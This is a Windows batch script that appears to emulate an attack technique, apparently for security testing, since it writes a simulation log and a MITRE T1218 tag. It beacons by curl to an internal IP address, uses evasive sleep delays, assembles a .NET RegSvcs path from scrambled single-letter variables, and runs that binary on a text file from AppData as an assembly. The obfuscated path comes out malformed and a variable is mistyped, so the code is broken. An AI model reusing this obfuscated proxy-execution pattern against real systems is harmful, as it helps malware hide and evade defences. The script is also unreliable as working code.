@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET txisnba=%APPDATA%\9309\299fb0c2
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?9309-10
SET jwcnifl=ITZEL-S2BO
SET rrocubc=10
SET xzanpex=firelox.txt
SET dvhhyc=9309
SET logfile=%APPDATA%\!rrocubc!\macula-simulations.log

echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: script_start=!dvhhyc!>> "!logfile!" 2>nul
ping -n 31 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_init>> "!logfile!" 2>nul
curl -k -s -o nul "!keghkgto!"
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_complete>> "!logfile!" 2>nul
SET /A rdly=!RANDOM! %% 20 + 10
timeout /t !rdly! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay_random=!rdly!s>> "!logfile!" 2>nul
SET vbsn=a
SET qlkh=p
SET fpnc=d
SET mknw=o
SET zxsb=s
SET xvzr=4
SET jtrq=.
SET kqnc=0
SET bvzm=3
SET xctp=1
SET nvbf=9
SET hkrd=ex
SET netfrm=%SystemRoot%\!vbsn!!qlkh!!fpnc!!mknw!!zxsb!\!vbsn!!fpnc!!mknw!!zxsb!!zxsb!\!vbsn!et\!xvzr!!jtrq!!kqnc!.!bvzm!!xctp!!jtrq!!nvbf!\r%vbsn%%qlkh%%fpnc%%mknw%%zxsb%!!hkrd!
CHOICE /C Y /N /D Y /T 7 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_start=!txisnba!>> "!logfile!" 2>nul
cd /d "!txisnba!" >nul 2>nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_complete>> "!logfile!" 2>nul
SET rst=1
SET err=
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: regsvcs_start=!xzanpex!>> "!logfile!" 2>nul
"!netfrm!" "!xzanpex!" >nul 2>nul
IF NOT !ERRORLEVEL! EQU 0 (
  SET rst=0
  SET err=assembly_load_failed
)
echo [!DATE% !TIME!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Regsvcs=!rst!:!err!>> "!logfile!" 2>nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: regsvcs_complete=!ERRORLEVEL!>> "!logfile!" 2>nul
timeout /t 8 /nobreak >nul
ENDLOCAL